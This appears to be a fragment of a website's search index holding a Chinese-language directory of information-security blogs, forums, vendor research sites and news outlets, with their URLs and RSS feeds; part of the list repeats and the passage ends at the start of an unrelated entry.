\u718a\u732b https://www.pandasecurity.com/ https://www.pandasecurity.com/mediacenter/feed/(\u603b) https://www.pandasecurity.com/mediacenter/malware/feed/ https://www.pandasecurity.com/mediacenter/technology/ \u5361\u5df4\u65af\u57fa\u5b9e\u9a8c\u5ba4 https://www.kaspersky.com/blog/ https://www.kaspersky.com/blog/feed/ AVAST https://blog.avast.com/ https://blog.avast.com/rss.xml VeraCode https://www.veracode.com/ http://www.veracode.com/blog/feed Akamai https://blogs.akamai.com/ http://feeds.feedburner.com/TheAkamaiBlog ComputerWeekly https://www.computerweekly.com/ https://www.computerweekly.com/rss/All-Computer-Weekly-content.xml https://www.computerweekly.com/rss/RSS-Feed.xml https://www.computerweekly.com/rss/ContentSyndication.xml https://www.computerweekly.com/rss/Latest-IT-news.xml https://www.computerweekly.com/rss/IT-security.xml https://www.computerweekly.com/editorspicks TechTarget https://www.techtarget.com https://searchsecurity.techtarget.com https://www.techtarget.com/feed/ https://www.techtarget.com/blog/feed/ https://searchsecurity.techtarget.com/rss/ContentSyndication.xml \u9999\u6e2f\u54cd\u5e94\u4e2d\u5fc3 https://www.hkcert.org/ https://www.hkcert.org/getrss/en/newsclipping https://www.hkcert.org/getrss/en/securitybulletin webroot https://www.webroot.com/blog/ https://www.webroot.com/blog/feed/ \u601d\u79d1 https://blogs.cisco.com/ https://blogs.cisco.com/feed https://feeds.feedburner.com/CiscoBlogThePlatform shieldsquare https://www.shieldsquare.com/blog/ https://www.shieldsquare.com/blog/feed/ WonderHowTo https://www.wonderhowto.com/ https://www.gadgethacks.com/ https://next.reality.news/ https://www.wonderhowto.com/rss.xml\uff08\u603b\uff09 https://null-byte.wonderhowto.com/rss.xml https://mind-hacks.wonderhowto.com/rss.xml NETRESEC\u7f51\u7edc\u5b89\u5168 https://www.netresec.com/ https://www.netresec.com/rss.ashx \u82f1\u7279\u5c14\u6280\u672f https://inteltechniques.com/rss/ https://inteltechniques.com/ https://inteltechniques.com/blog/feed/ http://feeds.soundcloud.com/users/soundcloud:users:261098918/sounds.rss TechCrunch https://techcrunch.com/ https://techcrunch.com/feed/ \u4fe1\u606f\u5468\u520a https://www.informationweek.com/ https://www.informationweek.com/rss_simple.asp https://www.informationweek.com/whitepaper/rss?gset=yes& https://www.informationweek.com/rss_simple.asp?f_n=462&f_ln=Security ArubaNetworks http://community.arubanetworks.com/t5/Blogs/ct-p/news?source=footer http://community.arubanetworks.com/aruba/rss/board?board.id=community-blog http://community.arubanetworks.com/aruba/rss/board?board.id=tech-blog CERT NetSA https://tools.netsa.cert.org/ https://tools.netsa.cert.org/releases.rss SEI\u535a\u5ba2 https://insights.sei.cmu.edu/sei_blog/ https://insights.sei.cmu.edu/sei_blog/rss.xml https://insights.sei.cmu.edu/cert/atom.xml https://insights.sei.cmu.edu/insider-threat/atom.xml https://insights.sei.cmu.edu/saturn/rss.xml https://insights.sei.cmu.edu/devops/rss.xml SecurityAffairs http://securityaffairs.co/wordpress/ http://securityaffairs.co/wordpress/feed BleepingComputer https://www.bleepingcomputer.com/ https://www.bleepingcomputer.com/feed/ BitDefender https://www.bitdefender.com/ https://labs.bitdefender.com/feed/ https://www.bitdefender.com/box/blog/feed/ http://feeds.feedburner.com/OemHubInsightsIntoAntivirusTechnologyLicensing?format=xml http://feeds.feedburner.com/BusinessInsightsInVirtualizationAndCloudSecurity?format=xml https://hotforsecurity.bitdefender.com/feed \u8c37\u6b4c\u535a\u5ba2 https://www.gcppodcast.com/ https://cloudplatform.googleblog.com/ https://security.googleblog.com/ http://feeds.feedburner.com/GcpPodcast?format=xml http://feeds.feedburner.com/ClPlBl http://feeds.feedburner.com/GoogleOnlineSecurityBlog \u6211\u4eec\u7684\u751f\u6d3b\u5b89\u5168 https://www.welivesecurity.com/ http://feeds.feedburner.com/eset/blog/\uff08\u603b\uff09 https://www.welivesecurity.com/category/malware/feed/ Connection https://community.connection.com/tags/security/ https://community.connection.com/feed-connection/ TechWorld https://www.techworld.com/ https://www.techworld.com/security/rss https://www.techworld.com/feature/rss TheGuardian https://www.theguardian.com/ https://www.theguardian.com/uk/rss(\u603b) https://www.theguardian.com/us/film/rss https://www.theguardian.com/us-news/rss Wired https://www.wired.com/ https://www.wired.com/feed/\uff08\u603b\uff09 https://www.wired.com/feed/category/security/latest/rss https://www.wired.com/feed/tag/wired-guide/latest/rss TechRepublic https://www.techrepublic.com/ https://www.techrepublic.com/rssfeeds/articles/ https://www.techrepublic.com/rssfeeds/downloads/ https://www.techrepublic.com/rssfeeds/topic/security/ https://www.techrepublic.com/rssfeeds/blog/10-things/ https://www.techrepublic.com/rssfeeds/blog/career-management/ https://www.techrepublic.com/rssfeeds/blog/european-technology/ https://www.techrepublic.com/rssfeeds/blog/asian-technology/ https://www.techrepublic.com/rssfeeds/topic/networking/ https://www.techrepublic.com/rssfeeds/blog/cracking-open/ https://www.techrepublic.com/rssfeeds/topic/google/ zdnet https://www.zdnet.com/ https://www.zdnet.com/rss.xml https://www.zdnet.com/news/rss.xml https://www.zdnet.com/blog/rss.xml https://www.zdnet.com/au/rss.xml https://www.zdnet.com/uk/rss.xml https://www.zdnet.com/us/rss.xml https://www.zdnet.com/as/rss.xml https://www.zdnet.com/blog/jacks-blog/rss.xml https://www.zdnet.com/blog/security/rss.xml https://www.zdnet.com/topic/security/rss.xml https://www.zdnet.com/topic/microsoft/rss.xml https://www.zdnet.com/blog/bott/rss.xml \u5b89\u5168\u5468\u520a https://securityweekly.com/ http://feeds.feedburner.com/securityweekly/XBIC HelpNetSecurity https://www.helpnetsecurity.com/ https://www.helpnetsecurity.com/feed/ RSA https://www.rsa.com/ https://www.rsa.com/en-us/blog/rss.xml TroyHunt https://www.troyhunt.com/ http://feeds.feedburner.com/TroyHunt?format=xml ZoneAlarm http://www.zonealarm.com/ http://www.zonealarm.com/blog/feed/ infosecurity https://www.infosecurity-magazine.com/ \u65e0 Sophos https://nakedsecurity.sophos.com/ https://nakedsecurity.sophos.com/feed/ \u65bd\u5948\u5c14 https://www.schneier.com/ https://www.schneier.com/blog/atom.xml DarkReading https://www.darkreading.com/Default.asp https://www.darkreading.com/rss_simple.asp\uff08\u603b\uff09 https://www.darkreading.com/rss_simple.asp?f_n=644&f_ln=Attacks/Breaches https://www.darkreading.com/rss_simple.asp?f_n=658&f_ln=Analytics https://www.darkreading.com/rss_simple.asp?f_n=659&f_ln=Threat%20Intelligence https://www.darkreading.com/rss_simple.asp?f_n=660&f_ln=Security%20Monitoring https://www.darkreading.com/rss_simple.asp?f_n=661&f_ln=Vulnerabilities%20/%20Threats https://www.darkreading.com/rss_simple.asp?f_n=662&f_ln=Advanced%20Threats https://www.darkreading.com/rss_simple.asp?f_n=663&f_ln=Insider%20Threats https://www.darkreading.com/rss_simple.asp?f_n=664&f_ln=Vulnerability%20Management KrebsonSecurity https://krebsonsecurity.com/ https://krebsonsecurity.com/feed/ \u8fc8\u514b\u83f2mcafee https://securingtomorrow.mcafee.com/ https://securingtomorrow.mcafee.com/feed/ ThreatPost https://threatpost.com/ https://threatpost.com/feed/ CsoonLine https://www.csoonline.com/ https://www.csoonline.com/index.rss Sans https://www.sans.org/ https://www.sans.org/reading-room/ https://www.sans.org/rss https://www.sans.org/tip-of-the-day/rss http://feeds.feedburner.com/SansInstituteMusings http://feeds.feedburner.com/SansTechnologyInstitute http://feeds.feedburner.com/SansInstituteSecLab TheDailyBeast https://www.thedailybeast.com/ https://feeds.thedailybeast.com/rss/articles Pentester https://pentester.land/ https://pentester.land/feed fail0verflow https://fail0verflow.com/blog/ \u65e0 Ryan Castellucci\u535a\u5ba2 https://rya.nc/ \u65e0 Benjojo\u535a\u5ba2 https://blog.benjojo.co.uk/ https://blog.benjojo.co.uk/rss.xml \u5361\u5c14\u8fc8\u5c14\u65af\u535a\u5ba2 https://cmyers.org/blog/blog.html \u65e0 DanKaminsky\u535a\u5ba2 https://dankaminsky.com/ https://dankaminsky.com/feed/ Filippo\u535a\u5ba2 https://blog.filippo.io/ https://blog.filippo.io/rss/ ImperialViolet\u535a\u5ba2 https://www.imperialviolet.org/posts-index.html \u65e0 MikeCardwell\u535a\u5ba2 https://www.grepular.com/ https://www.grepular.com/rss PeterKacherginsky\u535a\u5ba2 https://thesprawl.org/ https://thesprawl.org/feed/ S\u535a\u5ba2 https://s.ai/essays/ \u65e0 Signal\u535a\u5ba2 https://signal.org/blog/ \u65e0 WorthDoingBadly https://worthdoingbadly.com/ https://worthdoingbadly.com/feed.xml Liberty-Shell http://liberty-shell.com/sec/ \u65e0 Coffee https://highon.coffee/blog/ https://highon.coffee/feed SecuriTeam\u535a\u5ba2 https://blogs.securiteam.com/ https://blogs.securiteam.com/index.php/feed TheSpanner http://www.thespanner.co.uk/ http://www.thespanner.co.uk/feed/ VxJump http://www.vxjump.net/ \u65e0 Rossia http://lj.rossia.org/users/pr0mix/ http://lj.rossia.org/users/herm1t/ http://lj.rossia.org/users/pr0mix/data/rss http://lj.rossia.org/users/herm1t/data/rss ITNext https://itnext.io/ https://itnext.io/feed PhoenHex https://phoenhex.re/ https://phoenhex.re/feed.xml scmagazineuk https://www.scmagazineuk.com/ https://www.scmagazineuk.com/rss/home MalwareBytes https://blog.malwarebytes.com https://blog.malwarebytes.com/feed/ motherboard https://motherboard.vice.com/en_us https://motherboard.vice.com/en_us/rss portswigger https://portswigger.net/blog/ https://portswigger.net/daily-swig https://portswigger.net/blog/rss https://portswigger.net/daily-swig/rss threatpost https://threatpost.com/ https://threatpost.com/feed/ securityintelligence https://securityintelligence.com/ http://feeds.feedburner.com/SecurityIntelligence mdsec https://www.mdsec.co.uk/ https://www.mdsec.co.uk/feed/ https://www.mdsec.co.uk/blog/feed/ theregister https://www.theregister.co.uk/ https://www.theregister.co.uk/security/insider_threat/headlines.atom https://www.theregister.co.uk/emergent_tech/headlines.atom https://www.theregister.co.uk/personal_tech/headlines.atom hotforsecurity https://hotforsecurity.bitdefender.com/ https://hotforsecurity.bitdefender.com/feed sucuri https://blog.sucuri.net/ https://blog.sucuri.net/feed mcafee https://securingtomorrow.mcafee.com/ https://securingtomorrow.mcafee.com/feed/ zdnet https://www.zdnet.com/ https://www.zdnet.com/zdnet.opml kitploit https://www.kitploit.com/ https://feeds.feedburner.com/PentestTools nist https://nvd.nist.gov/ https://www.nist.gov/news-events/rss.xml checkpoint https://research.checkpoint.com/ https://research.checkpoint.com/feed/ bellingcat https://www.bellingcat.com/ https://www.bellingcat.com/feed/ \u5176\u4ed6 \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 \u5982\u4f55-ToGeek https://www.howtogeek.com/ https://feeds.howtogeek.com/howtogeek techopedia https://www.techopedia.com/ https://www.techopedia.com/feed/content/atom CloudFlare\u7684\u7684 https://blog.cloudflare.com/ https://blog.cloudflare.com/rss/ \u6b27\u76df\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u5c40 https://www.enisa.europa.eu/ https://www.enisa.europa.eu/front-page/RSS serverfault https://serverfault.com/ https://serverfault.com/feeds OSINT\u516c\u5f00\u6765\u6e90\u60c5\u62a5 https://github.com/lockfale/OSINT-Framework http://osintframework.com/ \u65e0 \u9ed1\u5e3d https://www.blackhat.com/ \u65e0 forbes https://www.forbes.com/ \u65e0 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/Youngs0xff/article/details/88195362","title":"\u4fe1\u606f\u5b89\u5168\u7ad9\u70b9\u6536\u96c6"},{"location":"other/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%99%E7%82%B9%E6%94%B6%E9%9B%86/#_1","text":"\u8f6c\u8f7d\u6765\u81ea\uff1a http://www.topdubhe.com/article-detials/4 \u56fd\u5185 \u535a\u5ba2 \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 Hcamael https://0x48.pw/ https://0x48.pw/rss.xml Evi1cg https://evi1cg.me/ https://evi1cg.me/feed gracecode https://www.gracecode.com/ http://feeds.gracecode.com/gracecode/ nMask's\u535a\u5ba2 https://thief.one/ https://thief.one/atom.xml \u7ec4\u7ec7\uff0c\u8bba\u575b \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 MottoIN http://www.mottoin.com/ http://www.mottoin.com/feed \u5b89\u5168\u5ba2 https://www.anquanke.com/ https://api.anquanke.com/data/v1/rss FREEBUF http://www.freebuf.com/ http://www.freebuf.com/feed http://www.freebuf.com/news/feed http://www.freebuf.com/sectool/feed http://www.freebuf.com/vuls/feed http://www.freebuf.com/articles/web/feed http://www.freebuf.com/articles/network/feed \u7f51\u7edc\u5b89\u5168\u7814\u7a76\u56fd\u9645\u5b66\u672f\u8bba\u575b https://www.inforsec.org/wp/ https://www.inforsec.org/wp/# \u8d81\u7740\u5e74\u8f7b http://chenzhenianqing.com/ http://chenzhenianqing.com/feed \u5148\u77e5\u793e\u533a https://xz.aliyun.com/ https://xz.aliyun.com/feed \u94f6\u6cb3\u5b9e\u9a8c\u5ba4 http://galaxylab.org/ http://galaxylab.org/feed/ \u6211\u6625\u79cb https://bbs.ichunqiu.com/forum.php \u65e0 \u5b89\u5168\u8109\u640f https://www.secpulse.com/ https://www.secpulse.com/feed \u5636\u543c http://www.4hou.com/ http://www.4hou.com/feed http://www.4hou.com/category/technology/feed \u5fae\u535a https://www.weibo.com/ttarticle/p/show?id=2309404263474069943104 \u65e0 \u6307\u5c16\u5b89\u5168 https://secfree.com/ https://secfree.com/rss 91\u65e5 http://www.91ri.org/ http://www.91ri.org/feed \u571f\u53f8\u5b89\u5168\u793e\u533a https://www.t00ls.net/ \u65e0 SecWiki https://sec-wiki.com/ https://sec-wiki.com/news/rss seebug https://paper.seebug.org/ https://paper.seebug.org/rss/ \u7384\u6b66\u5b9e\u9a8c\u5ba4 https://xlab.tencent.com/cn/ https://raw.githubusercontent.com/XuanwuLab/ XuanwuLab.github.io/master/cn/secnews/atom.xml https://xlab.tencent.com/cn/feed/ http://xuanwulab.github.io/cn/secnews/atom.xml \u817e\u8baf\u5b89\u5168\u54cd\u5e94\u4e2d\u5fc3 https://security.tencent.com/index.php/blog https://security.tencent.com/index.php/feed/blog/0 360\u5a01\u80c1\u60c5\u62a5\u4e2d\u5fc3 https://ti.360.net/blog/ \u65e0 360NetLab https://blog.netlab.360.com/ https://feedly.com/i/subscription/feed/http://blog.netlab.360.com/rss/ \u7eff\u76df\u79d1\u6280\u535a\u5ba2 http://blog.nsfocus.net/ http://blog.nsfocus.net/feed/ \u5b89\u5168\u725b http://www.aqniu.com/ http://www.aqniu.com/feed \u53f0\u6e7e\u8d8b\u52bf\u79d1\u6280 https://blog.trendmicro.com.tw/ https://blog.trendmicro.com.tw/?feed=rss2 \u77e5\u9053\u521b\u5b87 http://blog.knownsec.com/ http://blog.knownsec.com/feed/ \u5b89\u5168\u6751 https://www.sec-un.org/ https://www.sec-un.org/feed/ \u9ed1\u5ba2\u65b0\u95fb http://hackernews.cc/ http://hackernews.cc/feed \u6d1e\u6089\u6f0f\u6d1e https://www.seebug.org/ https://www.seebug.org/rss.xml \u543e\u7231\u7834\u89e3 https://www.52pojie.cn/ https://www.52pojie.cn/forum.php?mod=rss \u63a8\u9177 https://www.tuicool.com/ https://www.tuicool.com/mags/rss_programming.rss \u6811\u8393\u6d3e\u5b9e\u9a8c\u5ba4 http://shumeipai.nxez.com/ http://shumeipai.nxez.com/feed 51CTO http://netsecurity.51cto.com/col/518/ \u65e0 \u6bd4\u7279\u5e01\u8d22\u7ecf http://www.bitecoin.com/ http://www.bitecoin.com/feed \u56fd\u5916 \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 0\u5929 https://cn.0day.today/ https://0day.today/ https://cn.0day.today/rss https://0day.today/rss\uff08\u603b\uff09 MailClark https://mailclark.ai/blog/ https://mailclark.ai/blog/feed.xml Linux\u5b89\u5168 http://www.linuxsecurity.com/ http://www.linuxsecurity.com/static-content/linuxsecurity_hybrid.rss\uff08\u603b\uff09 http://www.linuxsecurity.com/static-content/linuxsecurity_advisories.rss http://www.linuxsecurity.com/static-content/linuxsecurity_articles.rss http://www.linuxsecurity.com/static-content/ubuntu.rss CX\u5b89\u5168 https://cxsecurity.com/ https://cxsecurity.com/wlb/rss/all/\uff08\u603b\uff09 https://cxsecurity.com/cverss/fullmap/\uff08\u603b\uff09 https://cxsecurity.com/wlb/rss/vulnerabilities/ https://cxsecurity.com/wlb/rss/exploit/ https://cxsecurity.com/wlb/rss/dorks/ \u63d0\u4f9b\u6f0f\u6d1e\u67e5\u627e https://www.exploitalert.com/ \u65e0 OA\u5b9e\u9a8c\u5ba4 https://oalabs.openanalysis.net/ https://oalabs.openanalysis.net/rss/ PaloAltoNetworks researchcenter.paloaltonetworks.com http://feeds.feedburner.com/PaloAltoNetworks PacketStorm\u5b89\u5168 https://packetstormsecurity.com/ https://rss.packetstormsecurity.com/ \u706b\u773c https://www.fireeye.com/blog/threat-research.html https://www.fireeye.com/blog/threat-research/_jcr_content.feed https://www.fireeye.com/blog/products-and-services/_jcr_content.feed https://www.fireeye.com/blog/executive-perspective/_jcr_content.feed \u8d8b\u52bf\u79d1\u6280 https://www.trendmicro.com/ http://feeds.trendmicro.com/Anti-MalwareBlog http://feeds.trendmicro.com/TrendMicroSimplySecurity \u6d41\u91cf\u5206\u6790 http://malware-traffic-analysis.net/ http://malware-traffic-analysis.net/blog-entries.rss \u8d5b\u95e8\u94c1\u514b https://www.symantec.com/blogs/ https://www.symantec.com/connect/item-feeds/all/all/feed/all/all/all https://api.connect.symantec.com/rss/v1/blogs/rss.xml F-Secure https://labsblog.f-secure.com/ https://www.f-secure.com/en/web/labs_global/home https://labsblog.f-secure.com/feed/ https://business.f-secure.com/feed/ https://safeandsavvy.f-secure.com/feed/ \u718a\u732b https://www.pandasecurity.com/ https://www.pandasecurity.com/mediacenter/feed/(\u603b) https://www.pandasecurity.com/mediacenter/malware/feed/ https://www.pandasecurity.com/mediacenter/technology/ \u5361\u5df4\u65af\u57fa\u5b9e\u9a8c\u5ba4 https://www.kaspersky.com/blog/ https://www.kaspersky.com/blog/feed/ AVAST https://blog.avast.com/ https://blog.avast.com/rss.xml VeraCode https://www.veracode.com/ http://www.veracode.com/blog/feed Akamai https://blogs.akamai.com/ http://feeds.feedburner.com/TheAkamaiBlog ComputerWeekly https://www.computerweekly.com/ https://www.computerweekly.com/rss/All-Computer-Weekly-content.xml https://www.computerweekly.com/rss/RSS-Feed.xml https://www.computerweekly.com/rss/ContentSyndication.xml https://www.computerweekly.com/rss/Latest-IT-news.xml https://www.computerweekly.com/rss/IT-security.xml https://www.computerweekly.com/editorspicks TechTarget https://www.techtarget.com https://searchsecurity.techtarget.com https://www.techtarget.com/feed/ https://www.techtarget.com/blog/feed/ https://searchsecurity.techtarget.com/rss/ContentSyndication.xml \u9999\u6e2f\u54cd\u5e94\u4e2d\u5fc3 https://www.hkcert.org/ https://www.hkcert.org/getrss/en/newsclipping https://www.hkcert.org/getrss/en/securitybulletin webroot https://www.webroot.com/blog/ https://www.webroot.com/blog/feed/ \u601d\u79d1 https://blogs.cisco.com/ https://blogs.cisco.com/feed https://feeds.feedburner.com/CiscoBlogThePlatform shieldsquare https://www.shieldsquare.com/blog/ https://www.shieldsquare.com/blog/feed/ WonderHowTo https://www.wonderhowto.com/ https://www.gadgethacks.com/ https://next.reality.news/ https://www.wonderhowto.com/rss.xml\uff08\u603b\uff09 https://null-byte.wonderhowto.com/rss.xml https://mind-hacks.wonderhowto.com/rss.xml NETRESEC\u7f51\u7edc\u5b89\u5168 https://www.netresec.com/ https://www.netresec.com/rss.ashx \u82f1\u7279\u5c14\u6280\u672f https://inteltechniques.com/rss/ https://inteltechniques.com/ https://inteltechniques.com/blog/feed/ http://feeds.soundcloud.com/users/soundcloud:users:261098918/sounds.rss TechCrunch https://techcrunch.com/ https://techcrunch.com/feed/ \u4fe1\u606f\u5468\u520a https://www.informationweek.com/ https://www.informationweek.com/rss_simple.asp https://www.informationweek.com/whitepaper/rss?gset=yes& https://www.informationweek.com/rss_simple.asp?f_n=462&f_ln=Security ArubaNetworks http://community.arubanetworks.com/t5/Blogs/ct-p/news?source=footer http://community.arubanetworks.com/aruba/rss/board?board.id=community-blog http://community.arubanetworks.com/aruba/rss/board?board.id=tech-blog CERT NetSA https://tools.netsa.cert.org/ https://tools.netsa.cert.org/releases.rss SEI\u535a\u5ba2 https://insights.sei.cmu.edu/sei_blog/ https://insights.sei.cmu.edu/sei_blog/rss.xml https://insights.sei.cmu.edu/cert/atom.xml https://insights.sei.cmu.edu/insider-threat/atom.xml https://insights.sei.cmu.edu/saturn/rss.xml https://insights.sei.cmu.edu/devops/rss.xml SecurityAffairs http://securityaffairs.co/wordpress/ http://securityaffairs.co/wordpress/feed BleepingComputer https://www.bleepingcomputer.com/ https://www.bleepingcomputer.com/feed/ BitDefender https://www.bitdefender.com/ https://labs.bitdefender.com/feed/ https://www.bitdefender.com/box/blog/feed/ http://feeds.feedburner.com/OemHubInsightsIntoAntivirusTechnologyLicensing?format=xml http://feeds.feedburner.com/BusinessInsightsInVirtualizationAndCloudSecurity?format=xml https://hotforsecurity.bitdefender.com/feed \u8c37\u6b4c\u535a\u5ba2 https://www.gcppodcast.com/ https://cloudplatform.googleblog.com/ https://security.googleblog.com/ http://feeds.feedburner.com/GcpPodcast?format=xml http://feeds.feedburner.com/ClPlBl http://feeds.feedburner.com/GoogleOnlineSecurityBlog \u6211\u4eec\u7684\u751f\u6d3b\u5b89\u5168 https://www.welivesecurity.com/ http://feeds.feedburner.com/eset/blog/\uff08\u603b\uff09 https://www.welivesecurity.com/category/malware/feed/ Connection https://community.connection.com/tags/security/ https://community.connection.com/feed-connection/ TechWorld https://www.techworld.com/ https://www.techworld.com/security/rss https://www.techworld.com/feature/rss TheGuardian https://www.theguardian.com/ https://www.theguardian.com/uk/rss(\u603b) https://www.theguardian.com/us/film/rss https://www.theguardian.com/us-news/rss Wired https://www.wired.com/ https://www.wired.com/feed/\uff08\u603b\uff09 https://www.wired.com/feed/category/security/latest/rss https://www.wired.com/feed/tag/wired-guide/latest/rss TechRepublic https://www.techrepublic.com/ https://www.techrepublic.com/rssfeeds/articles/ https://www.techrepublic.com/rssfeeds/downloads/ https://www.techrepublic.com/rssfeeds/topic/security/ https://www.techrepublic.com/rssfeeds/blog/10-things/ https://www.techrepublic.com/rssfeeds/blog/career-management/ https://www.techrepublic.com/rssfeeds/blog/european-technology/ https://www.techrepublic.com/rssfeeds/blog/asian-technology/ https://www.techrepublic.com/rssfeeds/topic/networking/ https://www.techrepublic.com/rssfeeds/blog/cracking-open/ https://www.techrepublic.com/rssfeeds/topic/google/ zdnet https://www.zdnet.com/ https://www.zdnet.com/rss.xml https://www.zdnet.com/news/rss.xml https://www.zdnet.com/blog/rss.xml https://www.zdnet.com/au/rss.xml https://www.zdnet.com/uk/rss.xml https://www.zdnet.com/us/rss.xml https://www.zdnet.com/as/rss.xml https://www.zdnet.com/blog/jacks-blog/rss.xml https://www.zdnet.com/blog/security/rss.xml https://www.zdnet.com/topic/security/rss.xml https://www.zdnet.com/topic/microsoft/rss.xml https://www.zdnet.com/blog/bott/rss.xml \u5b89\u5168\u5468\u520a https://securityweekly.com/ http://feeds.feedburner.com/securityweekly/XBIC HelpNetSecurity https://www.helpnetsecurity.com/ https://www.helpnetsecurity.com/feed/ RSA https://www.rsa.com/ https://www.rsa.com/en-us/blog/rss.xml TroyHunt https://www.troyhunt.com/ http://feeds.feedburner.com/TroyHunt?format=xml ZoneAlarm http://www.zonealarm.com/ http://www.zonealarm.com/blog/feed/ infosecurity https://www.infosecurity-magazine.com/ \u65e0 Sophos https://nakedsecurity.sophos.com/ https://nakedsecurity.sophos.com/feed/ \u65bd\u5948\u5c14 https://www.schneier.com/ https://www.schneier.com/blog/atom.xml DarkReading https://www.darkreading.com/Default.asp https://www.darkreading.com/rss_simple.asp\uff08\u603b\uff09 https://www.darkreading.com/rss_simple.asp?f_n=644&f_ln=Attacks/Breaches https://www.darkreading.com/rss_simple.asp?f_n=658&f_ln=Analytics https://www.darkreading.com/rss_simple.asp?f_n=659&f_ln=Threat%20Intelligence https://www.darkreading.com/rss_simple.asp?f_n=660&f_ln=Security%20Monitoring https://www.darkreading.com/rss_simple.asp?f_n=661&f_ln=Vulnerabilities%20/%20Threats https://www.darkreading.com/rss_simple.asp?f_n=662&f_ln=Advanced%20Threats https://www.darkreading.com/rss_simple.asp?f_n=663&f_ln=Insider%20Threats https://www.darkreading.com/rss_simple.asp?f_n=664&f_ln=Vulnerability%20Management KrebsonSecurity https://krebsonsecurity.com/ https://krebsonsecurity.com/feed/ \u8fc8\u514b\u83f2mcafee https://securingtomorrow.mcafee.com/ https://securingtomorrow.mcafee.com/feed/ ThreatPost https://threatpost.com/ https://threatpost.com/feed/ CsoonLine https://www.csoonline.com/ https://www.csoonline.com/index.rss Sans https://www.sans.org/ https://www.sans.org/reading-room/ https://www.sans.org/rss https://www.sans.org/tip-of-the-day/rss http://feeds.feedburner.com/SansInstituteMusings http://feeds.feedburner.com/SansTechnologyInstitute http://feeds.feedburner.com/SansInstituteSecLab TheDailyBeast https://www.thedailybeast.com/ https://feeds.thedailybeast.com/rss/articles Pentester https://pentester.land/ https://pentester.land/feed fail0verflow https://fail0verflow.com/blog/ \u65e0 Ryan Castellucci\u535a\u5ba2 https://rya.nc/ \u65e0 Benjojo\u535a\u5ba2 https://blog.benjojo.co.uk/ https://blog.benjojo.co.uk/rss.xml \u5361\u5c14\u8fc8\u5c14\u65af\u535a\u5ba2 https://cmyers.org/blog/blog.html \u65e0 DanKaminsky\u535a\u5ba2 https://dankaminsky.com/ https://dankaminsky.com/feed/ Filippo\u535a\u5ba2 https://blog.filippo.io/ https://blog.filippo.io/rss/ ImperialViolet\u535a\u5ba2 https://www.imperialviolet.org/posts-index.html \u65e0 MikeCardwell\u535a\u5ba2 https://www.grepular.com/ https://www.grepular.com/rss PeterKacherginsky\u535a\u5ba2 https://thesprawl.org/ https://thesprawl.org/feed/ S\u535a\u5ba2 https://s.ai/essays/ \u65e0 Signal\u535a\u5ba2 https://signal.org/blog/ \u65e0 WorthDoingBadly https://worthdoingbadly.com/ https://worthdoingbadly.com/feed.xml Liberty-Shell http://liberty-shell.com/sec/ \u65e0 Coffee https://highon.coffee/blog/ https://highon.coffee/feed SecuriTeam\u535a\u5ba2 https://blogs.securiteam.com/ https://blogs.securiteam.com/index.php/feed TheSpanner http://www.thespanner.co.uk/ http://www.thespanner.co.uk/feed/ VxJump http://www.vxjump.net/ \u65e0 Rossia http://lj.rossia.org/users/pr0mix/ http://lj.rossia.org/users/herm1t/ http://lj.rossia.org/users/pr0mix/data/rss http://lj.rossia.org/users/herm1t/data/rss ITNext https://itnext.io/ https://itnext.io/feed PhoenHex https://phoenhex.re/ https://phoenhex.re/feed.xml scmagazineuk https://www.scmagazineuk.com/ https://www.scmagazineuk.com/rss/home MalwareBytes https://blog.malwarebytes.com https://blog.malwarebytes.com/feed/ motherboard https://motherboard.vice.com/en_us https://motherboard.vice.com/en_us/rss portswigger https://portswigger.net/blog/ https://portswigger.net/daily-swig https://portswigger.net/blog/rss https://portswigger.net/daily-swig/rss threatpost https://threatpost.com/ https://threatpost.com/feed/ securityintelligence https://securityintelligence.com/ http://feeds.feedburner.com/SecurityIntelligence mdsec https://www.mdsec.co.uk/ https://www.mdsec.co.uk/feed/ https://www.mdsec.co.uk/blog/feed/ theregister https://www.theregister.co.uk/ https://www.theregister.co.uk/security/insider_threat/headlines.atom https://www.theregister.co.uk/emergent_tech/headlines.atom https://www.theregister.co.uk/personal_tech/headlines.atom hotforsecurity https://hotforsecurity.bitdefender.com/ https://hotforsecurity.bitdefender.com/feed sucuri https://blog.sucuri.net/ https://blog.sucuri.net/feed mcafee https://securingtomorrow.mcafee.com/ https://securingtomorrow.mcafee.com/feed/ zdnet https://www.zdnet.com/ https://www.zdnet.com/zdnet.opml kitploit https://www.kitploit.com/ https://feeds.feedburner.com/PentestTools nist https://nvd.nist.gov/ https://www.nist.gov/news-events/rss.xml checkpoint https://research.checkpoint.com/ https://research.checkpoint.com/feed/ bellingcat https://www.bellingcat.com/ https://www.bellingcat.com/feed/ \u5176\u4ed6 \u540d\u79f0 \u94fe\u63a5 RSS\u6e90 \u5982\u4f55-ToGeek https://www.howtogeek.com/ https://feeds.howtogeek.com/howtogeek techopedia https://www.techopedia.com/ https://www.techopedia.com/feed/content/atom CloudFlare\u7684\u7684 https://blog.cloudflare.com/ https://blog.cloudflare.com/rss/ \u6b27\u76df\u7f51\u7edc\u4e0e\u4fe1\u606f\u5b89\u5168\u5c40 https://www.enisa.europa.eu/ https://www.enisa.europa.eu/front-page/RSS serverfault https://serverfault.com/ https://serverfault.com/feeds OSINT\u516c\u5f00\u6765\u6e90\u60c5\u62a5 https://github.com/lockfale/OSINT-Framework http://osintframework.com/ \u65e0 \u9ed1\u5e3d https://www.blackhat.com/ \u65e0 forbes https://www.forbes.com/ \u65e0 \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/Youngs0xff/article/details/88195362","title":"\u4fe1\u606f\u5b89\u5168\u7ad9\u70b9\u6536\u96c6"},{"location":"other/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/","text":"\u5085\u91cc\u53f6\u53d8\u6362 \u672c\u6587\u662f \u5982\u679c\u770b\u4e86\u6b64\u6587\u4f60\u8fd8\u4e0d\u61c2\u5085\u91cc\u53f6\u53d8\u6362\uff0c\u90a3\u5c31\u8fc7\u6765\u6390\u6b7b\u6211\u5427 